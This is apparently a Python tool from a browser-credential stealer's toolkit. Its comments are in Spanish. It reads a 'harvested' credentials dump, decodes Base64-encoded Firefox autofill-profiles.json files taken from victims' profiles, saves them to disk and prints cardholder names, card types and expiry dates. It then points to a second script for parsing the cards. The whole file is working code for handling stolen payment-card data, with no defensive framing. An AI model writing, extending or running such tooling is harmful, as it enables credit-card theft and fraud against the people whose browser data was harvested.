#!/usr/bin/env python3
"""
Firefox RAW Cards Extractor
Extrae archivos autofill-profiles.json codificados en Base64 del archivo credentials_*.txt

Uso:
    python extract_firefox_cards.py harvested/credentials_1_20251020_063110.txt
"""

import sys
import re
import base64
import json
from pathlib import Path


def extract_firefox_raw_cards(credentials_file):
    """
    Extrae archivos Firefox-RAW-CARDS del archivo de credenciales
    
    Args:
        credentials_file: Ruta al archivo credentials_*.txt
    """
    creds_path = Path(credentials_file)
    
    if not creds_path.exists():
        print(f"[!] ERROR: File not found: {credentials_file}")
        return
    
    # Leer archivo de credenciales
    with open(creds_path, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Buscar bloques de Firefox-RAW-CARDS
    # Formato: [#X] [Firefox-RAW-CARDS]
    #         Name: <profile>::autofill-profiles.json
    #         Card: <base64_data>
    #         Expiration: <size>/9999
    
    pattern = r'\[#\d+\] \[Firefox-RAW-CARDS\]\s+Name: (.*?)::autofill-profiles\.json\s+Card: (.*?)\s+Expiration:'
    
    matches = re.findall(pattern, content, re.DOTALL)
    
    if not matches:
        print("[!] No Firefox-RAW-CARDS found in credentials file")
        return
    
    print(f"\n[+] Found {len(matches)} Firefox RAW card file(s)")
    
    # Directorio base para guardar archivos
    base_dir = Path("harvested") / "firefox"
    base_dir.mkdir(parents=True, exist_ok=True)
    
    for profile_name, b64_data in matches:
        # Crear directorio del perfil
        profile_dir = base_dir / profile_name
        profile_dir.mkdir(exist_ok=True)
        
        # Decodificar Base64
        try:
            file_data = base64.b64decode(b64_data.strip())
            
            # Guardar archivo JSON
            output_file = profile_dir / "autofill-profiles.json"
            with open(output_file, 'wb') as f:
                f.write(file_data)
            
            print(f"\n[+] Profile: {profile_name}")
            print(f"    Output: {output_file}")
            print(f"    Size: {len(file_data)} bytes")
            
            # Parse JSON para mostrar preview
            try:
                json_data = json.loads(file_data)
                
                # Mostrar info de tarjetas
                cards = json_data.get('creditCards', [])
                if cards:
                    print(f"    Cards found: {len(cards)}")
                    for i, card in enumerate(cards, 1):
                        name = card.get('cc-name', 'N/A')
                        card_type = card.get('cc-type', 'N/A')
                        exp = f"{card.get('cc-exp-month', '?')}/{card.get('cc-exp-year', '?')}"
                        encrypted = card.get('cc-number-encrypted', '')
                        
                        print(f"      [{i}] {name} - {card_type} - Exp: {exp}")
                        if encrypted:
                            print(f"          🔒 ENCRYPTED (Master Password required)")
                        else:
                            print(f"          ⚠️  No encryption data")
                else:
                    print(f"    ⚠️  No credit cards in file")
                
                # Mostrar info de direcciones
                addresses = json_data.get('addresses', [])
                if addresses:
                    print(f"    Addresses: {len(addresses)}")
                
            except json.JSONDecodeError:
                print(f"    ⚠️  Could not parse JSON (corrupted?)")
            
        except Exception as e:
            print(f"[!] ERROR extracting {profile_name}: {e}")
    
    print(f"\n{'='*60}")
    print(f"[+] Extraction Complete")
    print(f"{'='*60}")
    print(f"\n[+] Next steps:")
    print(f"    1. Parse cards with parse_firefox_cards.py:")
    for profile, _ in matches:
        profile_path = base_dir / profile / "autofill-profiles.json"
        print(f"       python tools/parse_firefox_cards.py {profile_path}")


def main():
    if len(sys.argv) < 2:
        print("Usage: python extract_firefox_cards.py <credentials_file>")
        print("\nExample:")
        print("  python extract_firefox_cards.py harvested/credentials_1_20251020_063110.txt")
        sys.exit(1)
    
    credentials_file = sys.argv[1]
    extract_firefox_raw_cards(credentials_file)


if __name__ == "__main__":
    main()
